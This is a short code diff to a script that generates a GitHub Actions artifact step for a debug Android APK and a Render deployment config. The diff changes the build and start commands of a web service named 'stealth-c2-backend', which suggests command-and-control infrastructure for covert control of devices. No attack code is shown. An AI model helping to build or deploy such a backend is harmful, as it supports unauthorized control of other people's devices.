@@ -769,7 +769,7 @@ jobs:
         name: app-debug
         path: android/app/build/outputs/apk/debug/app-debug.apk''')
 
-    # ==============================================================================
+   # ==============================================================================
     # 7. RENDER CONFIG
     # ==============================================================================
     print("[☁️] Generating Render config...")
@@ -778,8 +778,8 @@ jobs:
   - type: web
     name: stealth-c2-backend
     env: python
-    buildCommand: pip install -r backend/requirements.txt
-    startCommand: cd backend && gunicorn app:app
+    buildCommand: pip install -r requirements.txt
+    startCommand: gunicorn advanced_build:app
     envVars:
       - key: PORT
         value: 10000''')
